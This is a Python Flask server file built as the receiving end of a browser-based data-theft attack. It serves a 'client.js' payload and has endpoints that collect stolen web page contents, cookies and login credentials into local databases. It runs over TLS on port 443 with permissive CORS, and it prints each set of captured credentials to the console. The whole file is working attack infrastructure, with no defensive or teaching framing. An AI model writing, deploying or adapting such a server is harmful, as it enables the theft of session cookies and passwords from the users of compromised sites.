from flask import Flask, request, send_file
from db import sqlDB
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

html_pages = sqlDB('html_pages.db')
cookies = sqlDB('cookies.db')
credentials = sqlDB('credentials.db')
html_pages.create_db()
cookies.create_db()
credentials.create_db()

@app.route ('/client.js', methods=['GET'])
def clientjs():
	print("[+] Sending Payload")
	return send_file('./client.js', download_name='client.js')

@app.route ('/save_page', methods=['POST'])
def save_page():
	# print(request.form.keys())
	if 'url' not in request.form.keys() or 'content' not in request.form.keys():
		return "Invalid save page request", 400
	url = request.form['url']
	content = request.form['content']
	print(f"[+] Inserting content with url {url}")
	html_pages.insert_content((url, content))
	return "OK"

@app.route ('/save_cookies', methods=['POST'])
def save_cookies():
	if 'name' not in request.form.keys() or 'value' not in request.form.keys():
		return "Invalid save cookie request", 400
	name = request.form['name']
	value = request.form['value']
	cookies.insert_content((name, value))
	return "OK"

@app.route ('/save_credentials', methods=['POST'])
def save_credentials():
	if 'url' not in request.form.keys() or 'value' not in request.form.keys():
		return "Invalid save cookie request", 400
	url = request.form['url']
	value = request.form['value']
	print(f"[+] Received credentials for {url}!")
	print(value)
	credentials.insert_content((url, value))
	return "OK"

app.run(host='0.0.0.0', port=443, ssl_context=('cert.pem', 'key.pem'), debug=True)
